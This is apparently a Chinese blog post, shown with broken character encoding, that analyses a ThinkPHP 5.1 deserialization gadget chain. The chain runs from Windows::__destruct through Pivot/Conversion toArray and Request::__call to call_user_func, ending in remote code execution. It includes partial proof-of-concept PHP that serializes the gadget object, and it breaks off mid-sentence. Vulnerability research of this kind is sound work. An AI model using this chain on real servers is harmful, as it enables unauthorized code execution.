<strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304230129898.png" alt="image-20240304230129898"></p><p>è·Ÿè¿›**toJson()**æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231418906.png" alt="image-20240304231418906"></p><p>ç»§ç»­è·Ÿè¿›<strong>toArray()</strong></p><p>åœ¨<strong>toArray</strong>ä¸­**$relation<strong>å¯æ§, å¹¶ä¸”èµ‹å€¼åè°ƒç”¨</strong>$relation<strong>ä¸‹çš„</strong>visible()**</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231547711.png" alt="image-20240304231547711"></p><p>è·Ÿè¿›<strong>getAttr()æ–¹æ³•</strong>çœ‹çœ‹$relationåˆ°åº•ä»ä½•è€Œæ¥</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231259379.png" alt="image-20240304231259379"></p><p>è·Ÿè¿›<strong>getData()</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305001517580.png" alt="image-20240305001517580"></p><p>$this-&gt;data[$name]å¯æ§</p><p>è¿™é‡Œé™„ä¸€å¼ å¤§ä½¬çš„å›¾</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/4.png"></p><p>ä¾ç…§å¤§ä½¬çš„æ€è·¯, è¿™é‡Œæ²¡æœ‰å¯åˆ©ç”¨çš„visibleæ–¹æ³•, éœ€è¦ä¸€ä¸ª**_call()<strong>æ¥è¢«è¿™ä¸ª</strong>$relation-&gt;visible($name);**è§¦å‘</p><p>ä¾æ—§æ˜¯å…¨å±€æœç´¢, åœ¨<strong>think&#x2F;request</strong>ç±»ä¸­</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002602378.png" alt="image-20240305002602378"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002656453.png" alt="image-20240305002656453"></p><p>è¿™é‡Œ <strong>call_user_func_array</strong> å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å®Œå…¨å¯æ§, å› æ­¤æˆ‘ä»¬å¯ä»¥è°ƒç”¨<strong>call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args)</strong>, </p><p>è™½ç„¶ç¬¬330è¡Œç”¨ <strong>array_unshift</strong> å‡½æ•°æŠŠæœ¬ç±»å¯¹è±¡ <strong>$this</strong> æ”¾åœ¨æ•°ç»„å˜é‡ <strong>$args</strong> çš„ç¬¬ä¸€ä¸ªï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å¯»æ‰¾ä¸å—è¿™ä¸ªå‚æ•°å½±å“çš„æ–¹æ³•ã€‚</p><blockquote><p>åˆ†æè¿‡ <strong>ThinkPHP</strong> å†å² <strong>RCE</strong> æ¼æ´çš„äººå¯èƒ½çŸ¥é“ï¼Œ <strong>think\Request</strong> ç±»çš„ <strong>input</strong> æ–¹æ³•ç»å¸¸æ˜¯é“¾ä¸­ä¸€ä¸ªéå¸¸æ£’çš„ <strong>Gadget</strong> ï¼Œç›¸å½“äº <strong>call_user_func($filter,$data)</strong> ã€‚ä½†æ˜¯å‰é¢æˆ‘ä»¬è¯´è¿‡ï¼Œ <strong>$args</strong> æ•°ç»„å˜é‡çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œæ˜¯ä¸€ä¸ªå›ºå®šæ­»çš„ç±»å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ <strong>input</strong> æ–¹æ³•ï¼Œè€Œåº”è¯¥å¯»æ‰¾è°ƒç”¨ <strong>input</strong> çš„æ–¹æ³•ã€‚</p></blockquote><p>å…ˆæ¥çœ‹çœ‹<strong>input()<strong>æ–¹æ³•, è¿™é‡Œç›´æ¥å¯ä»¥æ‰§è¡Œä¸€ä¸ª</strong>call_user_func($filter,$data)</strong></p><p>å¯¹åº”å‚æ•° $default å’Œ $filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131417663.png" alt="image-20240305131417663"></p><p>å›è°ƒ$this-&gt;filterValue()æ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131601772.png" alt="image-20240305131601772"></p><p>æˆ‘ä»¬éœ€è¦æ§åˆ¶çš„å°±æ˜¯inputçš„ç¬¬ä¸€ä¸ªå‚æ•°$dataå’Œæœ€åä¸€ä¸ªå‚æ•°$filter</p><p>ç”±äºä¸Šé¢ä¹Ÿæåˆ°äº†**__call()** ä¸‹çš„<strong>call_user_func_array(array(ä»»æ„ç±»,ä»»æ„æ–¹æ³•),$args)<strong>ä¸­</strong>$args</strong>æ˜¯ä¸å¯æ§çš„($argsçš„ç¬¬ä¸€ä¸ªå€¼è¢«å¼ºåˆ¶å®šä¹‰), æ‰€ä»¥è¿™é‡Œæ— æ³•ç›´æ¥è°ƒç”¨<strong>input()</strong>,å› ä¸ºæˆ‘ä»¬ä¸èƒ½æ§åˆ¶å…¶å‚æ•°</p><p>æ‰€ä»¥åº”è¯¥è½¬è€ŒæŸ¥æ‰¾å“ªé‡Œè°ƒç”¨äº†<strong>input()</strong>,ä»¥æ­¤æ¥é—´æ¥è°ƒç”¨é¿å…æ‰**$args**çš„å½±å“</p><p>è¿™é‡Œä¸é€‰ç”¨request</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305132947432.png" alt="image-20240305132947432"></p><p>æ‰¾åˆ°å½“å‰ç±»çš„paramæ–¹æ³•, ç¬¬961è¡Œè°ƒç”¨äº†input, ä¸” ç¬¬ä¸€ä¸ªå‚æ•°å®Œå…¨å¯æ§,  ä½†$filterä¸å¯æ§, å› æ­¤, åˆéœ€è¦å¯»æ‰¾å“ªé‡Œè°ƒç”¨äº†paramæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135640187.png" alt="image-20240305135640187"></p><p>å¯ä»¥çœ‹è§, å½“å‰ç±»ä¸‹çš„isAjaxå’ŒisPjaxä¸¤ä¸ªæ–¹æ³•éƒ½è°ƒç”¨äº†paramæ–¹æ³•, ä¸”å‚æ•°å®Œå…¨å¯æ§</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135916160.png" alt="image-20240305135916160"></p><p>è‡³æ­¤, é“¾å­å°±æœ‰äº†</p><p>é¦–å…ˆ, åœ¨windows.phpä¸‹</p><p><strong>__destruct()</strong> â€“&gt; <strong>removeFiles()</strong>  â€“&gt;  <strong>__toString()</strong> â€“&gt;  </p><p>åœ¨Conversion.phpä¸‹</p><p>â€“&gt; <strong>__toString()</strong>  â€“&gt; <strong>toJson()</strong>  â€“&gt;  <strong>toArray()</strong> â€“&gt; </p><p>åœ¨request.phpä¸‹</p><p>â€“&gt; <strong>__call()</strong> â€“&gt;  <strong>isAjax()</strong>  â€“&gt; <strong>param()</strong>  â€“&gt; <strong>input()</strong>   â€“&gt; <strong>filterValue()</strong>  â€“&gt;  <strong>call_user_func()</strong></p><p>è´´ä¸€å¼ å¤§ä½¬çš„å›¾</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/10.png"></p><h3 id="ç»†èŠ‚"><a href="#ç»†èŠ‚" class="headerlink" title="ç»†èŠ‚"></a>ç»†èŠ‚</h3><p>ä¸Šé¢å·²ç»æ‰¾å‡ºæ¥äº†ä¸€æ¡é“¾å­, ä½†æ˜¯å…·ä½“ç»†èŠ‚å¹¶æ²¡æœ‰å…³æ³¨</p><p>å‰é¢çš„**__destruct**çš„è§¦å‘ä¸å¿…å¤šè¯´, ä½†æ˜¯ **__toString()**çš„è§¦å‘å°±å‡ºç°äº†ç¬¬ä¸€ä¸ªå‘</p><p>æˆ‘ä»¬åœ¨Conversionç±»çš„å®šä¹‰å¤„å¯ä»¥å‘ç°, Conversionç±»æ˜¯è¢«traitä¿®é¥°çš„, å› æ­¤, å®ƒå¹¶ä¸èƒ½è¢«å®ä¾‹åŒ–, ä½†æ˜¯traitä¿®é¥°çš„ç±»å¯ä»¥è¢«å…¶ä»–ç±»use,è¾¾åˆ°ç±»ä¼¼ç»§æ‰¿çš„æ•ˆæœ</p><p>æŸ¥æ‰¾ä¸€ä¸‹useäº†Conversionçš„åœ°æ–¹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102313714.png" alt="image-20240306102313714"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªModelç±», è·Ÿè¿›çœ‹ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102413394.png" alt="image-20240306102413394"></p><p>Modelè™½ç„¶useäº†Conversion, ä½†å®ƒåˆè¢«abstractä¿®é¥°, å› æ­¤ä¹Ÿä¸å¯ä»¥å®ä¾‹åŒ–, ä½†æˆ‘ä»¬å¯ä»¥å†æŸ¥æ‰¾ç»§æ‰¿Modelçš„ç±»</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102637593.png" alt="image-20240306102637593"></p><p>ä¸éš¾å‘ç°æœ‰ä¸€ä¸ªPivotç±»æ˜¯ç»§æ‰¿äº†Modelç±»çš„,</p><p>å› æ­¤, Pivoté€šè¿‡ç»§æ‰¿useäº†Conversionç±»çš„Modelç±»,é—´æ¥å­˜åœ¨ä¸€ä¸ªtoStringæ–¹æ³•</p><p>å› æ­¤, è§¦å‘é“¾çš„å¼€å¤´å°±æ˜¯</p><p>Windows-&gt;__destruct()   â€”â€”â€”â€”â€”â€”-&gt;&gt;&gt;&gt;     Pivot-&gt;toString()</p><p><strong>poc</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ä¸Šé¢çš„ç»§æ‰¿å…³ç³»å¹¶ä¸ç”¨å…³å¿ƒ, ä¸æºç ä¸­ç›¸åŒå³å¯</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];<span class="comment">//è§¦å‘Pivot(Conversion)-&gt;__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æ­¤, ä»£ç æ‰§è¡Œåå°±ä¼šè·³è½¬åˆ°Pivot ä¸‹çš„toString, ç”±äºè¿™ä¸ªæ–¹æ³•æ˜¯ç»§æ‰¿çš„Conversionçš„, è‡ªç„¶ä¼šè·³è½¬åˆ°Conversionç±»ä¸­</p><p>éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡ŒWindows-&gt;filesæ˜¯ä¸€ä¸ªæ•°ç»„, è¿™æ˜¯ç”±æºç ä¸­å®šä¹‰çš„</p><p>è·³è½¬åˆ°toStringå, ä¾æ¬¡è¦è¿›å…¥çš„æ˜¯toJson,  toArray, ä¸­é—´çš„è¿‡ç¨‹å¹¶æ²¡æœ‰ä¼ é€’æˆ‘ä»¬å¯æ§çš„å‚æ•°, æ‰€ä»¥å¹¶ä¸å…³å¿ƒ</p><p>toArrayçš„ä»£ç æ®µæ¯”è¾ƒé•¿, éƒ½æ˜¯éå†äº†å‡ ä¸ªthisä¸‹çš„å¯æ§å˜é‡, æˆ‘ä»¬åªå…³å¿ƒä»¥ä¸‹è¿™ä¸ªéå†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// è¿½åŠ å±æ€§ï¼ˆå¿…é¡»å®šä¹‰è·å–å™¨ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;    <span class="comment">//$this-&gt;appendæ•°ç»„ä¸‹çš„ä¸€ä¸ªå€¼éœ€è¦ä¸ºæ•°ç»„</span></span><br><span class="line">            <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);<span class="comment">//$this-&gt;append as $key =&gt; $name</span></span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            <span class="comment">// è¿½åŠ å…³è”å¯¹è±¡å±æ€§</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$item</span>;</span><br></pre></td></tr></table></figure><p>å‡†ç¡®æ¥è¯´, åªå…³å¿ƒè¿™å…¶ä¸­çš„</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306105934360.png" alt="image-20240306105934360"></p><p>æˆ‘ä»¬æƒ³è¦çš„æ˜¯æ‰§è¡Œåˆ°$relation-&gt;visible($name);æ¥è°ƒç”¨ä¸€ä¸ª_call, æ‰€ä»¥éœ€è¦å‡ ä¸ªæ¡ä»¶</p><ol><li>è¿›å…¥ 186è¡Œçš„if</li><li>åœ¨$relation &#x3D; $this-&gt;getRelation($key);æ“ä½œå, $relationå˜æˆä¸€ä¸ªfalseæˆ–è€…null,ä»¥è¿›å…¥ä¸‹ä¸€ä¸ªifå†…</li><li>$relation &#x3D; $this-&gt;getAttr($key);å$relationå˜æˆæˆ‘ä»¬æŒ‡å®šçš„ä¸€ä¸ªå¯¹è±¡, ä»¥è°ƒç”¨è¯¥å¯¹è±¡ä¸‹ä¸å­˜åœ¨çš„visibleæ–¹æ³•æ¥è§¦å‘è¯¥å¯¹è±¡çš„__callæ–¹æ³•</li></ol><p>è¿™é‡Œæ“ä½œçš„æ˜¯$this-&gt;append as $key &#x3D;&gt; $name, è®°ä½è¿™ä¸ª, ç„¶åè·Ÿè¿›$relation &#x3D; $this-&gt;getRelation($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306110629197.png" alt="image-20240306110629197"></p><p>æˆ‘ä»¬ä¸ç»™$this-&gt;relationèµ‹å€¼, æ‰€ä»¥, ä¸è®ºå¦‚ä½•è¿™éƒ½ä¼šè¿”å›ä¸€ä¸ªç©ºå€¼</p><p>è¿™é‡Œè¿”å›ç©ºå€¼, ç›´æ¥è¿›å…¥æˆ‘ä»¬é¢„æœŸçš„ifå†…</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111809929.png" alt="image-20240306111809929"></p><p>ç»§ç»­è·Ÿè¿›ä¸‹ä¸€ä¸ªè°ƒç”¨çš„$relation &#x3D; $this-&gt;getAttr($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111135706.png" alt="image-20240306111135706"></p><p>ä»£ç åé¢$valueæ˜¯è¿™ä¸ªgetAttrçš„è¿”å›å€¼, å®ƒç”±$value    &#x3D; $this-&gt;getData($name);å†³å®š, ç»§ç»­è·Ÿè¿›getData</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111534803.png" alt="image-20240306111534803"></p><p>è¿™é‡Œæœ‰å¾ˆå¤šç§returnçš„å€¼, ä½†æ˜¯ä¸è¦å¿˜äº†, getDataçš„è¿”å›å€¼returnç»™getAttr,   getAttrç›´æ¥å°†å¾—åˆ°çš„å€¼è¿”å›ç»™</p><p>$relation, æˆ‘ä»¬éœ€è¦$relationä¸ºä¸€ä¸ªå¯¹è±¡å®ä¾‹</p><p>è¿™é‡ŒgetDataçš„å‚æ•°$nameæ¥è‡ªäºthis-&gt;appendæ•°ç»„çš„key, æ‰€ä»¥å°±å¯ä»¥è®©</p><p>this-&gt;data &#x3D; [â€˜naclâ€™&#x3D;&gt;new Request]; &#x2F;&#x2F;Requestå­˜åœ¨_callæ–¹æ³•</p><p>this-&gt;append &#x3D; [â€˜naclâ€™ &#x3D;&gt; [â€˜naclâ€™ &#x3D;&gt; â€˜naclâ€™]];    &#x2F;&#x2F;è¿™é‡Œå¿…é¡»æœ‰ä¸€ä¸ªvalueæ˜¯æ•°ç»„</p><p>åªéœ€è¦ä¿è¯this-&gt;dataå’Œthis-&gt;appendæ‹¥æœ‰ç›¸åŒçš„é”®, å³å¯å°†è¯¥é”®æ‰€å¯¹åº”çš„å€¼è¿”å›ç»™$relation</p><p>æ³¨: è¿™é‡ŒPovitçš„dataå±æ€§æ˜¯ç»§æ‰¿è‡ªAttributeç±», è€Œappendç»§æ‰¿å­Conversionç±»</p><p>æ›´æ–°pocä¸º:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p>è·³è½¬åˆ°Requestç±»çš„__call</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306125911092.png" alt="image-20240306125911092"></p><p>ä¾ç…§ä¸€å¼€å§‹çš„é“¾å­, æ­¤æ—¶éœ€è¦å€ŸåŠ©call_user_func_arrayç”¨this-&gt;hookæ¥è§¦å‘this-&gt;Ajax</p><p>ä¹Ÿå°±æ˜¯ $this-&gt;hook &#x3D; [â€œvisibleâ€&#x3D;&gt;[$this,â€isAjaxâ€]];</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306130953805.png" alt="image-20240306130953805"></p><p>æˆåŠŸè·³è½¬åˆ°isAjax, æ­¤æ—¶æˆ‘ä»¬ä¸ç”¨å…³å¿ƒä¼ è¿‡æ¥çš„å‚æ•°, å› ä¸º330è¡Œçš„array_unshiftå°†$thisæ’å…¥åˆ°äº†$argsæœ€å‰é¢,ä½¿å¾—è¿™ä¸ªå‚æ•°ä¸å¯æ§</p><p>ä¹‹å, æˆ‘ä»¬éœ€è¦é€šè¿‡paramçš„è°ƒç”¨æ¥è°ƒç”¨åˆ°input</p><p>paramæ¥æ”¶ä¸€ä¸ªå‚æ•°ä¸º$this-&gt;config[â€˜var_ajaxâ€™]å®Œå…¨å¯æ§,è·Ÿè¿›param</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306131812594.png" alt="image-20240306131812594"></p><p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ä¼šå°†GETæ•°ç»„èµ‹å€¼ç»™<code>this-&gt;param</code>å±æ€§</p><p><strong>æ³¨:  ç»è¿‡è°ƒè¯•å‘ç°, åœ¨è¿˜æ²¡æœ‰æ‰§è¡Œååºåˆ—åŒ–ä¹‹å‰, æ­¤æ–¹æ³•å·²ç»è¢«è°ƒç”¨è¿‡, å®ƒå°†getè¯·æ±‚çš„æ•°æ®ä»¥é”®å€¼å¯¹çš„æ–¹å¼èµ‹å€¼ç»™$this-&gt;param</strong></p><p>è¿™é‡Œè°ƒç”¨äº†inputä¼ å…¥çš„å‰ä¸¤ä¸ªé‡è¦å‚æ•°$this-&gt;paramå’Œ$name($nameå³ä¸º$this-&gt;config[â€˜var_ajaxâ€™])</p><p>è·Ÿè¿›input</p><p>æ­¤æ—¶ä¼ å…¥çš„$dataå°±æ˜¯getè¯·æ±‚æ•°æ®çš„é”®å€¼å¯¹, $nameç”±$this-&gt;config[â€˜var_ajaxâ€™]å¯æ§å†³å®š</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306134002703.png" alt="image-20240306134002703"></p><p>è¿™é‡Œåˆå‡ºç°äº†ä¸€æ¬¡getData, å®é™…ä¸Š, è¿™ä¸ªgetDataå°±æ˜¯å°†ä¼ 